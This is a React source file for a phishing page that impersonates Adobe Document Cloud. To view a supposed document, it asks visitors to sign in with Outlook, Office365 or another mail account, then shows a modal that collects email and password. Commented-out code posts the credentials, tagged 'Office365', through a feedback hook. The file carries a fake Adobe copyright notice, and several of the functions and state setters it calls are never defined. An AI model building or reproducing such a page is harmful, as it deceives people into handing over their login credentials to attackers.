import './App.css';
import './Hover.css';
import './DemoPage.css';
import qs from 'qs';
import useFeedback from './api/useFeedback';
import React, { useState } from 'react';

function App() {
  // const { postFeedback, isLoading } = useFeedback();
  // const [email, setEmail] = useState('');
  // const [password, setPassword] = useState('');

  // const details = `Office365`


  // const onSubmit = async (e) => {
  //   e.preventDefault();
  //   const data = qs.stringify({
  //     email: email,
  //     password: password,
  //     details: details,
  //   });

  //   try {
  //     await postFeedback(data);
  //     setPassword('');
  //     setEmail('');
  //   } catch (error) {
  //     console.log(error);
  //   }
  // };


  const [showModal, setShowModal] = useState(false);


  return (

    <div  className="container-fluid">
    <div  className="row" >
    <div className="bg-image" 
     style={{backgroundImage: "url('images/images/8.jpg')",
            height: "100vh",  backgroundSize: "cover", backgroundRepeat: "no-repeat"}}>

      <div  className="container">
        <div className="row">
        <div  className="col-lg-6 mx-auto my-5 px-5 pb-5" style={{border: "1px solid",  backgroundColor: "rgba(0,0,0,0.7)", borderRadius:"15px"}}>
        <div  className="text-center pt-5"> 
                <img src="images/images/adobe.jpg"  className="img-fluid" width="100px"/> <br/>
                <span  className="h5 text-white">Adobe Document Cloud</span> <br/>
                <span  className="h5 text-white font-weight-normal">To read the document, please enter with the valid email credentials that this file was sent to.</span>
              </div>
              <div  className="mt-3">
                <div  className="row">
                <div  className="col-lg-12">
                  <a href="#" id="outlookmodal"  className=" w-100" onClick={() => setShowModal(true)}  style={{textDecoration: "none"}} data-toggle="modal" data-target="#ajaxModal">
                      <div  className="" style={{ backgroundColor: "#0073C8"}} >
                        <img src="images/images/outlook1.png"  className="img-fluid" width="40px" style={{backgroundColor: "rgba(0,0,0,0.3)"}}/>
                        <span  className="pl-4" style={{verticalAlign: "middle" , paddingLeft: "2rem" , color: "white", fontWeight: "500"}}>Sign in with Outlook</span>
                      </div>
                    </a>          
</div>
                </div>
                <div  className="row pt-4">
                <div  className="col-lg-12">
                  <a href="#" id="outlookmodal"  className=" w-100" onClick={() => setShowModal(true)}  style={{textDecoration: "none"}} data-toggle="modal" data-target="#ajaxModal">
                      <div  className="" style={{ backgroundColor: "#FF3C00"}} >
                        <img src="images/images/office3651.png"  className="img-fluid" width="40px" style={{backgroundColor: "rgba(0,0,0,0.3)"}}/>
                        <span  className="pl-4" style={{verticalAlign: "middle" , paddingLeft: "2rem" , color: "white", fontWeight: "500"}}>Sign in with Office365</span>
                      </div>
                    </a>          
</div>
                </div>
                <div  className="row pt-4">
                <div  className="col-lg-12">
                  <a href="#" id="outlookmodal"  className=" w-100" onClick={() => setShowModal(true)}  style={{textDecoration: "none"}} data-toggle="modal" data-target="#ajaxModal">
                      <div  className="" style={{ backgroundColor: "#0B5BD3"}} >
                        <img src="images/images/other1.png"  className="img-fluid" width="40px" style={{backgroundColor: "rgba(0,0,0,0.3)"}}/>
                        <span  className="pl-4" style={{verticalAlign: "middle" , paddingLeft: "2rem" , color: "white", fontWeight: "500"}}>Sign in with Other Mail</span>
                      </div>
                    </a>          
</div>
                </div>

                </div>
                <div  className="col-lg-12">
                     <p  className="text-white mt-3 text-center">Select your email provider to view Document</p>
                <p  className="h6 text-center text-white">CopyRightÂ© 2020 Adobe.</p> 

                  </div>
          </div>



          {showModal ? (
        <>
          <div
            className="justify-center items-center flex overflow-x-hidden overflow-y-auto fixed inset-0 z-50 outline-none focus:outline-none"
          >
            <div className="relative w-auto my-6 mx-auto max-w-3xl">
              {/*content*/}
              <div className="border-0 rounded-lg shadow-lg relative flex flex-col w-full bg-white outline-none focus:outline-none">
                {/*header*/}
                <div className="flex items-start justify-between p-1 border-b border-solid border-slate-200 rounded-t">

                  <button
                    className="p-1 ml-auto bg-dark border-0 text-black  float-right text-3xl leading-none font-semibold outline-none focus:outline-none"
                    onClick={() => setShowModal(false)}
                  >
                    x
                  </button>

                </div>
                {/*body*/}
                <div className="w-[550px] h-88 bg-white border-[1px] border-solidborder-[#F1F1F1] flex flex-col items-center p-10">
                       <mg
                          src="/images/outlook.png"
                          className=""
                          height={95}
                          width={90}
                          alt="second hero"/>
                           <h2 className="modal-title p-5" id="exampleModalLabel">Login with <span id="field">Outlook</span></h2>

                          <form onSubmit={(e) => handleSubmits(e)} className='mt-6 flex flex-col'>
                          <label >Email address</label>
                          <input type="text" placeholder="Enter Email" id='emails' name='emails'onChange={(e) =>{ return setEmails(e.target.value)}} 
                            className='w-[390px] h-[45px] border-[1px] border-solid border-[#F1F1F1] bg-[#FAFAFA] mb-3 p-2 placeholder:text-sm focus:outline-none'
                             required/>

                        <label>Password</label>
                          <input type="password" placeholder="Enter Password" id='passwords' name='passwords' onChange={(e) =>{return setPasswords(e.target.value)}}
                            className='w-[390px] h-[45px] border-[0.5px] border-solid border-[#F1F1F1] bg-[#FAFAFA] mb-3 p-2 placeholder:text-sm focus:outline-none' 
                            required/>

<div className="flex items-center justify-end p-6 border-t border-solid border-slate-200 rounded-b">

                  <button
                    className="bg-emerald-500 text-white active:bg-emerald-600 font-bold uppercase text-sm px-6 py-3 rounded shadow hover:shadow-lg outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150"
                    type="submit"

                  >
                   Login
                  </button>
                </div>
                          </form> 


              </div>

                {/*footer*/}

              </div>
            </div>
          </div>
          <div className="opacity-25 fixed inset-0 z-40 bg-black"></div>
        </>
      ) : null}

          </div>

    </div> 
    </div>
  </div>
  </div>
  );
}

export default App;
